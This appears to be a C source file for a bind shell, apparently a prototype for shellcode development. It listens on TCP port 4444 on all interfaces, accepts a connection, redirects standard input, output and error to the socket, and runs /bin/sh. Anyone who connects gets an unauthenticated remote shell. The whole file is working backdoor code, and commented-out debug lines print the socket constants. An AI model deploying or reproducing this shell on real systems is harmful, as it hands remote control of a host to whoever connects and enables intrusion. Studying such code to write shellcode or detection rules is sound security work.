#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h> 
#include <arpa/inet.h>
#include <stdio.h>

int main(void)
{
        struct sockaddr_in ip4addr;
	int socketfd;
	int clientfd;

        ip4addr.sin_family = AF_INET;
        ip4addr.sin_port = htons(4444);
	//inet_pton(AF_INET, "192.168.158.139", &ip4addr.sin_addr);
	ip4addr.sin_addr.s_addr = INADDR_ANY;

	//printf("AF_INET: %d \n", AF_INET);
	//printf("PF_INET: %d \n", PF_INET);
	//printf("SOCK_STREAM: %d \n", SOCK_STREAM);
	//printf("INADDR_ANY: %d \n", INADDR_ANY);
	//printf("sizeof ip4addr: %d \n", sizeof ip4addr);
	//printf("htons(4444): %d \n", htons(4444));

	socketfd = socket(PF_INET, SOCK_STREAM, 0);
	bind(socketfd, (struct sockaddr*)&ip4addr, sizeof ip4addr); 

        listen(socketfd, 0);
        clientfd = accept(socketfd, NULL, NULL);
 
        dup2(clientfd, 0);
        dup2(clientfd, 1);
        dup2(clientfd, 2);
 
        execve("/bin/sh", NULL, NULL);
        return 0;
}
